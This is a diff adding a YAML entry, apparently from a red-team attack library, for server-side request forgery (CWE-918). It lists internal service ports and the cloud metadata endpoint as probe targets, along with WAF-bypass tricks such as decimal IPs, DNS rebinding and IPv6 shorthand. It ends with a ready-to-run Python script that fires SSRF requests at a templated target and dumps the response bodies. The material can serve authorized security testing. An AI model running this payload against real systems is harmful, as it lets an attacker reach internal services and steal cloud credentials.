@@ -1,0 +1,22 @@
+metadata:
+  id: cwe-918-ssrf
+  name: Server-Side Request Forgery
+  cwe_ids:
+  - CWE-918
+  target_type: generic
+  tags:
+  - ssrf
+  - internal-probe
+  - cloud-metadata
+  - dns-rebinding
+  - waf-bypass
+  author: co-redteam
+  severity: high
+content: "Internal probing targets:\n127.0.0.1:6379 (Redis), localhost:3306 (MySQL),\
+  \ localhost:8080, localhost:22\nCloud metadata endpoints:\n169.254.169.254/latest/meta-data/\
+  \ (AWS/GCP/Azure)\n\nWAF bypass techniques:\n- Decimal IP: 2130706433 = 127.0.0.1\n\
+  - Short URL redirect\n- DNS rebinding\n- IPv6 shorthand: ::1, 0:0:0:0:0:0:0:1\n\
+  - URL encoding variations\n\nExample:\nimport requests,urllib3; urllib3.disable_warnings();\
+  \ base='{TARGET_BASE_URL}'\ntargets=['http://127.0.0.1:22','http://127.0.0.1:3306','http://169.254.169.254/latest/meta-data/']\n\
+  for t in targets:\n    r=requests.get(f'{base}{ENDPOINT}?url={t}', verify={VERIFY_FLAG},\
+  \ timeout=5)\n    print('###CHAIN_OUTPUT###'+str({'target':t,'status':r.status_code,'len':len(r.text),'body':r.text[:200]}))\n"
